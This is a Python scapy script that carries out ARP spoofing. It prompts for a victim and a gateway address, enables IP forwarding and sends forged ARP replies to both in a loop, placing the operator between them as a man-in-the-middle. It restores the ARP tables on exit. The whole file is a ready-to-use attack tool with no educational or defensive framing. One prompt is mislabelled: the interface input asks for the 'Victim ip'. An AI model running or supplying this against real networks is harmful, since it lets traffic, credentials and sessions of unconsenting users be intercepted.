import time
import sys
import scapy.all as scapy

interface = None
sent_packet_count = 0

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, iface=interface, timeout=2, verbose=False)[0]

    try:
        return answered_list[0][1].hwsrc
    except IndexError:
        print(f"[-] Failed to get MAC for {ip}")
        return None


def arp_spoof(target_ip, spoof_ip):
    global sent_packet_count
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"[-] Cannot resolve MAC for {target_ip}. Aborting.")
        sys.exit(1)

    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, iface=interface, verbose=False)
    sent_packet_count += 1
    print(f"[+] Spoofed {target_ip} → {spoof_ip} is at {target_mac}")


def restore(destination_ip, source_ip):
    dest_mac = get_mac(destination_ip)
    src_mac = get_mac(source_ip)
    if not dest_mac or not src_mac:
        return

    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=src_mac)
    scapy.send(packet, iface=interface, verbose=False)
    print(f"[+] Restored ARP: {destination_ip} → {source_ip} ({src_mac})")


def enable_ip_forwarding():
    try:
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('1')
        print("[+] IP forwarding enabled")
    except Exception as e:
        print(f"[-] Failed to enable IP forwarding: {e}")
        sys.exit(1)


def disable_ip_forwarding():
    try:
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('0')
        print("[+] IP forwarding disabled")
    except:
        pass  


if __name__ == "__main__":
    interface = input("Enter the Victim ip: ") 
    scapy.conf.iface = interface
    victim_ip = input("Enter the Victim ip: ")  
    gateway_ip = input("Enter the gateway ip: ")  
    verbose = False

    enable_ip_forwarding()

    try:
        print("[*] Press Ctrl+C to stop and restore ARP tables...")
        while True:
            arp_spoof(victim_ip, gateway_ip)   
            arp_spoof(gateway_ip, victim_ip)   
            print(f"[+] Packets sent: {sent_packet_count}", end="\r")
            sys.stdout.flush()
            time.sleep(1)

    except KeyboardInterrupt:
        print("[!] Ctrl+C detected. Restoring ARP tables...")
    except Exception as e:
        print(f"\n[-] Error: {e}")
    finally:
        restore(victim_ip, gateway_ip)
        restore(gateway_ip, victim_ip)
        disable_ip_forwarding()
        print("[+] ARP tables restored. IP forwarding disabled. Exiting safely.")




